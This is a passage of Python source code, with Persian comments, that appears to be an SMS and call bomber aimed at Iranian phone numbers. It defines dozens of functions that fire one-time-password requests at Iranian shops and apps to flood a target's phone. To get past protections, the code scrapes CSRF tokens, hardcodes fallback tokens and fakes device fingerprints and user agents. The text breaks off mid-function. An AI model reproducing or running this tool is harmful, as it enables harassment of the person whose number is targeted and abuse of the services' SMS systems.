import random
import uuid
import re
from re import match, sub
import socket
import sys
import urllib3
import requests  
from os import system, name
from platform import node, system, release
from threading import Thread
from time import sleep


try:
    from requests import get, post
except ImportError:
    system("python3 -m pip install requests")


user_agents = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0", 
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
]

# رنگ‌ها برای خروجی
r, g, y, a = '\033[31;1m', '\033[32;1m', '\033[33;1m', '\033[0m'

# ==========================
# بررسی اتصال اینترنت
# ==========================
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ==========================
# اعتبارسنجی شماره‌ها
# ==========================
def is_phone(phone_input: str):
    phones = phone_input.split('-')
    valid_phones = []
    for phone in phones:
        phone = phone.strip()
        if re.match(r"^(?:\+989|989|09|9)\d{9}$", phone):
            valid_phones.append(re.sub(r"^(?:\+989|989|09|9)", "+989", phone))
        else:
            print(f"{r}[-] Invalid Phone: {phone}{a}")
    return valid_phones if valid_phones else False

# ==========================
# تابع ارسال ایمن
# ==========================
def send_service_safe(service, phone):
    try:
        service(phone)
    except Exception as e:
        print(f"{r}[!] {service.__name__} Exception for {phone}: {e}{a}")

# ==========================
# توابع سرویس‌ها
# ==========================

def ShahreSandal(phone):
    try:
        session = requests.Session()
        
        # ابتدا صفحه اصلی را برای دریافت CSRF Token بگیریم
        home_response = session.get(
            "https://shahresandal.com/",
            headers={"User-Agent": random.choice(user_agents)},
            timeout=10
        )
        
        # استخراج CSRF Token از صفحه
        csrf_token = None
        csrf_patterns = [
            r'name="csrf-token" content="([^"]+)"',
            r'X-CSRF-TOKEN["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'csrfToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in csrf_patterns:
            match = re.search(pattern, home_response.text)
            if match:
                csrf_token = match.group(1)
                break
        
        if not csrf_token:
            print(f'{r}[-] ShahreSandal: Could not extract CSRF Token{a}')
            return False
        
        print(f'{g}[+] CSRF Token: {csrf_token}{a}')
        
        # حالا درخواست ارسال کد
        url = "https://shahresandal.com/sendcode"
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "X-CSRF-Token": csrf_token,
            "User-Agent": random.choice(user_agents),
            "Origin": "https://shahresandal.com",
            "Referer": "https://shahresandal.com/",
            "X-Requested-With": "XMLHttpRequest"
        }
        
        payload = {
            "mobile": formatted_phone
        }
        
        response = session.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f'{y}[Debug] ShahreSandal Status: {response.status_code}{a}')
        print(f'{y}[Debug] ShahreSandal Response: {response.text}{a}')
        
        if response.status_code in [200, 201, 202]:
            try:
                data = response.json()
                if data.get("success") or data.get("status") == "success":
                    print(f'{g}(ShahreSandal) Code Sent{a}')
                    return True
            except:
                if "success" in response.text.lower():
                    print(f'{g}(ShahreSandal) Code Sent{a}')
                    return True
        elif response.status_code == 419:
            print(f'{r}[-] ShahreSandal: CSRF Token Expired/Invalid{a}')
            return False
        
        return False
            
    except Exception as e:
        print(f'{r}[!] ShahreSandal Exception: {e}{a}')
        return False
        

def Balad(phone):
    try:
        formatted_phone = "0" + phone.replace("+98", "")  # تبدیل +989... به 09...
        
        url = "https://account.api.balad.ir/api/web/auth/login/"
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "device-id": str(uuid.uuid4()),
            "User-Agent": random.choice(user_agents)
        }
        
        payload = {
            "phone_number": formatted_phone,
            "os_type": "W"
        }
        
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(Balad) Code Sent{a}')
            return True
        else:
            print(f'{r}[-] Balad HTTP Error: {response.status_code} - {response.text[:100]}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Balad Exception: {e}{a}')
        return False


def Charsooq(phone):
    try:
        url = "https://app.charsooq.com/api/v1/send-otp"
        
        # فرمت شماره: 09113339999 (با صفر اول)
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"  # مطمئن شویم که با صفر شروع می‌شود
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": random.choice(user_agents),
            "Origin": "https://app.charsooq.com",
            "Referer": "https://app.charsooq.com/",
        }
        
        payload = {
            "cell_number": formatted_phone  # با فرمت 09123334455
        }
        
        response = requests.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f'{y}[Debug] Charsooq Status: {response.status_code}{a}')
        print(f'{y}[Debug] Charsooq Response: {response.text}{a}')
        
        if response.status_code in [200, 201, 202]:
            print(f'{g}(Charsooq) Code Sent{a}')
            return True
        elif response.status_code == 422:
            print(f'{y}[!] Charsooq Validation Error{a}')
            return False
        else:
            print(f'{r}[-] Charsooq HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Charsooq Exception: {e}{a}')
        return False



def Koohshid(phone):
    try:
        session = requests.Session()
        
        # دریافت صفحه اصلی برای استخراج CSRF
        home_response = session.get(
            "https://koohshid.com/",
            headers={"User-Agent": random.choice(user_agents)},
            timeout=10
        )
        
        # استخراج CSRF از صفحه
        csrf_match = re.search(r'name="csrf" value="([^"]+)"', home_response.text)
        csrf = csrf_match.group(1) if csrf_match else "5282f04eb5"
        
        if not csrf:
            print(f'{r}[-] Koohshid: Could not extract CSRF token{a}')
            return False
        
        print(f'{g}[+] CSRF Token: {csrf}{a}')
        
        # آماده سازی payload
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        
        payload = {
            "action": "digits_check_mob",
            "countrycode": "+98",
            "mobileNo": formatted_phone,
            "csrf": csrf,
            "login": "2",
            "username": "",
            "email": "",
            "captcha": "",
            "captcha_ses": "",
            "json": "1",
            "whatsapp": "0"
        }
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://koohshid.com",
            "Referer": "https://koohshid.com/",
        }
        
        response = session.post(
            "https://koohshid.com/wp-admin/admin-ajax.php",
            data=payload,
            headers=headers,
            timeout=10
        )
        
        print(f'{y}[Debug] Koohshid Status: {response.status_code}{a}')
        print(f'{y}[Debug] Koohshid Response: {response.text}{a}')
        
        if response.status_code == 200:
            try:
                data = response.json()
                if data.get("success") or "sent" in str(data).lower():
                    print(f'{g}(Koohshid) Code Sent{a}')
                    return True
                else:
                    print(f'{r}[-] Koohshid Failed: {data.get("message", "Unknown")}{a}')
                    return False
            except:
                if "1" in response.text or "success" in response.text.lower():
                    print(f'{g}(Koohshid) Code Sent{a}')
                    return True
                return False
        else:
            print(f'{r}[-] Koohshid HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Koohshid Exception: {e}{a}')
        return False
        

def Okala(phone):
    try:
        url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister"
        
        # فرمت شماره
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "X-Correlation-Id": str(uuid.uuid4()),
            "session-id": str(uuid.uuid4()),
            "ui-version": "2.0",
            "source": "okala",
            "User-Agent": random.choice(user_agents),
            "Origin": "https://okala.com",
            "Referer": "https://okala.com/",
        }
        
        payload = {
            "mobile": formatted_phone,
            "confirmTerms": True,
            "notRobot": False,
            "ValidationCodeCreateReason": 5,
            "OtpApp": 0,
            "deviceTypeCode": 7,
            "IsAppOnly": False
        }
        
        response = requests.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f'{y}[Debug] Okala Status: {response.status_code}{a}')
        print(f'{y}[Debug] Okala Response: {response.text}{a}')
        
        if response.status_code in [200, 201, 202]:
            try:
                data = response.json()
                if data.get("success") or data.get("isSuccess") or data.get("otpSent"):
                    print(f'{g}(Okala) Code Sent{a}')
                    return True
                else:
                    print(f'{r}[-] Okala Failed: {data.get("message", "Unknown error")}{a}')
                    return False
            except:
                if "success" in response.text.lower() or "otp" in response.text.lower():
                    print(f'{g}(Okala) Code Sent{a}')
                    return True
                return False
        else:
            print(f'{r}[-] Okala HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Okala Exception: {e}{a}')
        return False



def Besparto(phone):
    try:
        session = requests.Session()
        
        # اول صفحه اصلی را بگیریم تا توکن را استخراج کنیم
        home_response = session.get(
            "https://besparto.ir/",
            headers={"User-Agent": random.choice(user_agents)},
            timeout=10
        )
        
        # استخراج Client-Token از صفحه
        client_token = None
        token_patterns = [
            r'Client-Token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'clientToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'\$2y\$10\$[a-zA-Z0-9./]+'  # pattern برای توکن های bcrypt
        ]
        
        for pattern in token_patterns:
            match = re.search(pattern, home_response.text)
            if match:
                client_token = match.group(0)  # کل match را بگیریم
                print(f'{g}[+] Found Client-Token: {client_token}{a}')
                break
        
        if not client_token:
            # اگر توکن پیدا نشد، از توکن پیشفرض استفاده کنیم
            client_token = "$2y$10$KH69txfOkqZuhxqF2W1BR.6o0jrrw.X53TH4dMmYfhCDNtwwq/8n6"
            print(f'{y}[!] Using default Client-Token{a}')
        
        # حالا درخواست ارسال کد
        url = "https://api.besparto.ir/customer/v1/token/"
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Client-Token": client_token,
            "User-Agent": random.choice(user_agents),
            "Origin": "https://besparto.ir",
            "Referer": "https://besparto.ir/",
        }
        
        payload = {
            "mobile": formatted_phone
        }
        
        response = session.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f'{y}[Debug] Besparto Status: {response.status_code}{a}')
        print(f'{y}[Debug] Besparto Response: {response.text}{a}')
        
        if response.status_code in [200, 201, 202]:
            try:
                data = response.json()
                if data.get("success") or data.get("status") == "success":
                    print(f'{g}(Besparto) Code Sent{a}')
                    return True
                else:
                    print(f'{r}[-] Besparto Failed: {data.get("message", "Unknown error")}{a}')
                    return False
            except:
                if "success" in response.text.lower() or "sent" in response.text.lower():
                    print(f'{g}(Besparto) Code Sent{a}')
                    return True
                return False
        else:
            print(f'{r}[-] Besparto HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Besparto Exception: {e}{a}')
        return False



def DigikalaJet(phone):
    try:
        url = "https://api.digikalajet.ir/user/login-register/"
        
        # فرمت شماره
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "X-Request-UUID": str(uuid.uuid4()),
            "ClientId": f"FINGERPRINT-{uuid.uuid4().hex[:20]}",
            "ClientOs": "iOS",
            "Client": "mobile",
            "product-mode": "shop_product",
            "session": f"{uuid.uuid4()}-V2{random.randint(1000000000, 9999999999)}",
            "app-id": str(uuid.uuid4()),
            "clientid-v2": f"FINGERPRINTV2-{uuid.uuid4().hex[:20]}",
            "User-Agent": random.choice(user_agents),
            "Origin": "https://digikalajet.ir",
            "Referer": "https://digikalajet.ir/",
        }
        
        payload = {
            "phone": formatted_phone
        }
        
        response = requests.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f'{y}[Debug] DigikalaJet Status: {response.status_code}{a}')
        print(f'{y}[Debug] DigikalaJet Response: {response.text}{a}')
        
        if response.status_code in [200, 201, 202]:
            try:
                data = response.json()
                if data.get("success") or data.get("status") == "success":
                    print(f'{g}(DigikalaJet) Code Sent{a}')
                    return True
                else:
                    print(f'{r}[-] DigikalaJet Failed: {data.get("message", "Unknown error")}{a}')
                    return False
            except:
                if "success" in response.text.lower() or "sent" in response.text.lower():
                    print(f'{g}(DigikalaJet) Code Sent{a}')
                    return True
                return False
        else:
            print(f'{r}[-] DigikalaJet HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] DigikalaJet Exception: {e}{a}')
        return False



def Sandalestan(phone):
    try:
        session = requests.Session()
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        # اول صفحه را بگیریم تا CSRF Token و fingerprint را دریافت کنیم
        url = f"https://sandalestan.com/register-opt?mobile={formatted_phone}"
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }
        
        # دریافت صفحه اول
        response = session.get(url, headers=headers, timeout=10)
        
        # استخراج CSRF Token
        csrf_token = None
        csrf_pattern = r'name="csrf-token" content="([^"]+)"'
        match = re.search(csrf_pattern, response.text)
        if match:
            csrf_token = match.group(1)
        
        if not csrf_token:
            print(f'{r}[-] Sandalestan: Could not extract CSRF Token{a}')
            return False
        
        # استخراج fingerprint از صفحه (اگر وجود دارد)
        fingerprint_id = f"fp{random.randint(100000, 999999)}"
        
        # آماده سازی payload برای Livewire
        payload = {
            "fingerprint": {
                "id": fingerprint_id,
                "name": "auth.register",
                "locale": "fa",
                "path": "register-opt",
                "method": "GET"
            },
            "serverMemo": {
                "children": [],
                "errors": [],
                "htmlHash": "7c608e69",
                "data": {
                    "name": None,
                    "password": None,
                    "password_confirmation": None,
                    "email": None,
                    "introducer_mobile": None,
                    "newsletter": 1,
                    "mobile": formatted_phone,
                    "code": None,
                    "step": 2,
                    "type_code": None,
                    "user": None
                },
                "dataMeta": [],
                "checksum": "e089e0c638f7d93a25a684677583a927f8e8af92fd12451b098269cae6685216"
            },
            "updates": [
                {
                    "type": "callMethod",
                    "payload": {
                        "method": "resend",
                        "params": []
                    }
                }
            ]
        }
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/json",
            "Accept": "text/html, application/xhtml+xml",
            "X-Livewire": "true",
            "X-CSRF-TOKEN": csrf_token,
            "Referer": f"https://sandalestan.com/register-opt?mobile={formatted_phone}",
            "Origin": "https://sandalestan.com"
        }
        
        # ارسال درخواست به Livewire
        response = session.post(
            "https://sandalestan.com/livewire/message/auth.register",
            json=payload,
            headers=headers,
            timeout=10
        )
        
        print(f'{y}[Debug] Sandalestan Status: {response.status_code}{a}')
        print(f'{y}[Debug] Sandalestan Response: {response.text[:200]}...{a}')
        
        if response.status_code == 200:
            print(f'{g}(Sandalestan) Code Sent{a}')
            return True
        else:
            print(f'{r}[-] Sandalestan HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Sandalestan Exception: {e}{a}')
        return False
        



def vitrin_shop(phone):
    formatted_phone = "0" + re.sub(r'[^0-9]', '', phone.replace("+98", ""))
    try:
        session = requests.Session()
        home_response = session.get("https://www.vitrin.shop/", timeout=10)
        fresh_token = session.cookies.get('XSRF-TOKEN', "default-token")
        url = "https://www.vitrin.shop/api/v1/user/request_code"
        payload = {"phone_number": formatted_phone, "forgot_password": False}
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "V-Session-ID": str(uuid.uuid4()),
            "V-Fingerprint-ID": str(uuid.uuid4()),
            "X-XSRF-TOKEN": fresh_token,
        }
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f'{g}(vitrin_shop) Code Sent to {phone}{a}')
        else:
            print(f"{r}[-] (vitrin_shop) HTTP Error: {response.status_code}{a}")
    except Exception as e:
        print(f"{r}[!] vitrin_shop Exception: {e}{a}")

def elanza(phone):
    formatted_phone = "0" + re.sub(r'[^0-9]', '', phone.replace("+98", ""))
    try:
        url = "https://api.elanza.com/auth/request"
        payload = {"contact": formatted_phone}
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f'{g}(elanza) Code Sent to {phone}{a}')
        else:
            print(f"{r}[-] (elanza) HTTP Error: {response.status_code}{a}")
    except Exception as e:
        print(f"{r}[!] elanza Exception: {e}{a}")

def trip_call(phone):
    url = "https://gateway.trip.ir/api/Totp"
    payload = {"PhoneNumber": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Trip - Call) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Trip - Call) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Trip - Call Exception: {e}{a}')
        return False

def paklean_call(phone):
    url = "https://client.api.paklean.com/user/resendVoiceCode"
    payload = {"username": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Paklean - Call) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Paklean - Call) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Paklean - Call Exception: {e}{a}')
        return False

def barghman(phone):
    url = "https://uiapi2.saapa.ir/api/otp/sendCode"
    payload = {"mobile": "0" + phone.split("+98")[1], "from_meter_buy": False}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Bargh-e Man) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Bargh-e Man) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Bargh-e Man Exception: {e}{a}')
        return False

def ragham_call(phone):
    url = "https://web.raghamapp.com/api/users/code"
    payload = {"phone": phone}  # اینجا نیازی به 0 نیست، همون phone که میدی
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Ragham - Call) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Ragham - Call) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Ragham - Call Exception: {e}{a}')
        return False



def angeliran(phone):
    import requests
    
    digits_phone = phone.replace("+98", "")
    formatted_phone = f"{digits_phone[:3]}+{digits_phone[3:6]}+{digits_phone[6:]}"
    
    try:
        url = "https://angeliran.com/wp-admin/admin-ajax.php"
        
        payload = {
            "digits_phone": formatted_phone,
            "login_digt_countrycode": "+98",
            "action_type": "phone",
            "digits_reg_name": "نام",
            "digits_process_register": "1",
            "sms_otp": "",
            "otp_step_1": "1",
            "digits_otp_field": "1",
            "digits": "1",
            "instance_id": "6f8ca37725ee2166c8fc02c16e17a299",  # instance_id جدید
            "action": "digits_forms_ajax",
            "type": "login",
            "digits_redirect_page": "https://angeliran.com/my-account/",
            "digits_form": "23837de77d",
            "_wp_http_referer": "/?login=true&redirect_to=https%3A%2F%2Fangeliran.com%2Fmy-account%2F&page=1",
            "show_force_title": "1",
            "container": "digits_protected",  # اضافه شده
            "sub_action": "sms_otp"  # اضافه شده
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://angeliran.com",
            "Referer": "https://angeliran.com/?login=true&redirect_to=https%3A%2F%2Fangeliran.com%2Fmy-account%2F&page=1",
        }
        
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            response_data = response.json()
            if response_data.get("success") is True:
                print(f'{g}(angeliran) {a}Code Sent')
                return True
        
        print(f'{r}[-] (angeliran) Failed{a}')
        return False
            
    except Exception:
        print(f'{r}[-] (angeliran) Failed{a}')
        return False
        

def mahabadperfume(phone):
    import requests
    import uuid
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://mahabadperfume.ir/backend/customer/v2/otp-send/s/"
    
    payload = {
        "phone_number": formatted_phone,
        "is_forget_password": False
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "X-Customer-Signature": str(uuid.uuid4()),  # تولید UUID تصادفی
        "Origin": "https://mahabadperfume.ir",
        "Referer": "https://mahabadperfume.ir/",
        "accept-language": "fa-IR",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(mahabadperfume) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (mahabadperfume) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] mahabadperfume Exception: {e}{a}')
        return False


def theshoes(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://theshoes.ir/api/v1/sessions/login_request"
    
    payload = {
        "mobile_phone": formatted_phone,
        "recaptcha_token": "dummy_token"  # توکن اصلی رو باید خودت بگیری
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://theshoes.ir",
        "Referer": "https://theshoes.ir/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f'{g}(theshoes) {a}Code Sent')
            return True
        print(f'{r}[-] (theshoes) HTTP Error: {response.status_code}{a}')
        return False
    except Exception as e:
        print(f'{r}[!] theshoes Exception: {e}{a}')
        return False
        
def mootanroo(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://api.mootanroo.com/api/v3/auth/fadce78fbac84ba7887c9942ae460e0c/send-otp"
    
    payload = {
        "PhoneNumber": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://mootanroo.com",
        "Referer": "https://mootanroo.com/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(mootanroo) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (mootanroo) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] mootanroo Exception: {e}{a}')
        return False

def bodoroj(phone):
    import requests
    import re
    
    digits_phone = phone.replace("+98", "")
    
    try:
        session = requests.Session()
        home_response = session.get("https://bodoroj.com/", timeout=10)
        
        # استخراج instance_id
        instance_id = None
        instance_pattern = r'name="instance_id" value="([a-f0-9]+)"'
        match = re.search(instance_pattern, home_response.text)
        if match:
            instance_id = match.group(1)
        
        if not instance_id:
            instance_id = "83143976e95c57bfaa643ec00be89a6a"
        
        url = "https://bodoroj.com/wp-admin/admin-ajax.php"
        
        # استفاده از پارامترهای کامل
        payload = {
            "login_digt_countrycode": "+98",
            "digits_phone": digits_phone,
            "digits_email": "",
            "action_type": "phone",
            "digits_reg_name": "نام",
            "digits_process_register": "1",
            "sms_otp": "",
            "otp_step_1": "1",
            "digits_otp_field": "1",
            "rememberme": "1",
            "digits": "1",
            "instance_id": instance_id,
            "action": "digits_forms_ajax",
            "type": "login",
            "digits_redirect_page": "//bodoroj.com/?page=1&redirect_to=https%3A%2F%2Fbodoroj.com%2F",
            "digits_form": "fa139d7ce8",
            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fbodoroj.com%2F",
            "show_force_title": "1",
            "container": "digits_protected",
            "sub_action": "sms_otp"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://bodoroj.com",
            "Referer": "https://bodoroj.com/",
        }
        
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        print(f'{g}[+] Status: {response.status_code}{a}')
        print(f'{g}[+] Response: {response.text}{a}')
        
        if response.status_code == 200:
            try:
                response_data = response.json()
                if response_data.get("success") is True:
                    print(f'{g}(bodoroj) {a}Code Sent')
                    return True
            except:
                if response.text.strip() == "1":
                    print(f'{g}(bodoroj) {a}Code Sent')
                    return True
        
        print(f'{r}[-] (bodoroj) Failed{a}')
        return False
            
    except Exception as e:
        print(f'{r}[!] bodoroj Exception: {e}{a}')
        return False


def riiha(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://www.riiha.ir/api/v1.0/authenticate"
    
    payload = {
        "mobile": formatted_phone,
        "mobile_code": "",
        "type": "mobile"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://www.riiha.ir",
        "Referer": "https://www.riiha.ir/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(riiha) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (riiha) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] riiha Exception: {e}{a}')
        return False


def niktakala(phone):
    import requests
    import uuid
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://niktakala.com/backend/customer/v2/otp-send/s/"
    
    payload = {
        "phone_number": formatted_phone,
        "is_forget_password": False
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "X-Customer-Signature": str(uuid.uuid4()),
        "accept-language": "fa-IR",
        "Origin": "https://niktakala.com",
        "Referer": "https://niktakala.com/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(niktakala) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (niktakala) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] niktakala Exception: {e}{a}')
        return False
        
def payonshoes(phone):
    import requests
    import re
    
    formatted_phone = "0" + phone.replace("+98", "")
    
    try:
        session = requests.Session()
        home_response = session.get("https://payonshoes.com/", timeout=10)
        
        # استخراج CSRF_TOKEN
        csrf_token = None
        csrf_patterns = [
            r'name="csrf" value="([a-f0-9]+)"',
            r'name="dig_nounce" value="([a-f0-9]+)"'
        ]
        
        for pattern in csrf_patterns:
            match = re.search(pattern, home_response.text)
            if match:
                csrf_token = match.group(1)
                break
        
        if not csrf_token:
            csrf_token = "11d30be44d"
        
        url = "https://payonshoes.com/wp-admin/admin-ajax.php"
        
        payload = {
            "action": "digits_check_mob",
            "countrycode": "+98",
            "mobileNo": formatted_phone,  # با صفر
            "csrf": csrf_token,
            "login": "2",
            "username": "",
            "email": "",
            "captcha": "",
            "captcha_ses": "",
            "json": "1",
            "whatsapp": "0"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://payonshoes.com",
            "Referer": "https://payonshoes.com/",
        }
        
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            if response.text.strip() == "1":
                print(f'{g}(payonshoes) {a}Code Sent')
                return True
        
        print(f'{r}[-] (payonshoes) Failed{a}')
        return False
            
    except Exception:
        print(f'{r}[-] (payonshoes) Failed{a}')
        return False


def mobilex(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://backend.mobilex.ir/api/v1/user/login/otp"
    
    payload = {
        "mobile": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
